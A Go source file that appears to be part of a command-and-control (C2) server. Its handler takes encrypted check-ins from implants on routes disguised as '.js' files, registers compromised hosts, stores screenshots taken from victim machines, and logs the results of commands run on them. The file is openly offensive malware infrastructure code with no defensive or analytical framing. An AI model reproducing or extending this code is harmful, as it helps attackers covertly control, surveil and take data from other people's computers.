package clientApi

import (
	"C2-Server/middle"
	"C2-Server/sql3"
	"encoding/json"
	"github.com/gin-gonic/gin"
)

//主机心跳检测

type OnlineInfo struct {
	Uuid string `json:"uuid"` //uuid唯一标识
	//Ip         string `json:"ip"`         //上线ip
	Msgtype string `json:"msgtype"`
	Msg     string `json:"msg"`
	Msgid   string `json:"msgid"` //生成msgid
}

func Online(c *gin.Context) {
	action := c.Param("action")
	//fmt.Println(action)
	a, _ := c.GetRawData()
	uuid := c.GetHeader("uuid")
	decodestr := middle.Decodestr(string(a), uuid)
	jsonstr := OnlineInfo{}
	json.Unmarshal([]byte(decodestr), &jsonstr)
	msgtype := jsonstr.Msgtype
	//fmt.Println("uuid",jsonstr.Msgtype)
	switch action {
	case "/Online.js": //如果是空就上线
		if msgtype == "online" {
			Getmsginfo(c,jsonstr)
		} else {
			s := GetDatademo("")
			bc := EncodeStr(uuid, string(s))
			c.String(200, string(bc))
		}
	case "/AddHost.js":
		hostjson := HostList{}
		json.Unmarshal([]byte(decodestr), &hostjson)
		//fmt.Println(string(decodestr))
		AddHosts(c,hostjson)
	case "/Screenshot.js":
		if jsonstr.Msg != "" {
			sql3.ScHost(jsonstr.Uuid, jsonstr.Msg)
			sql3.UpCmdret(jsonstr.Uuid, jsonstr.Msgid, "ok")
		}
	case "/RunCmd.js":
		sql3.UpCmdret(jsonstr.Uuid, jsonstr.Msgid, jsonstr.Msg)
	default:
	}

}
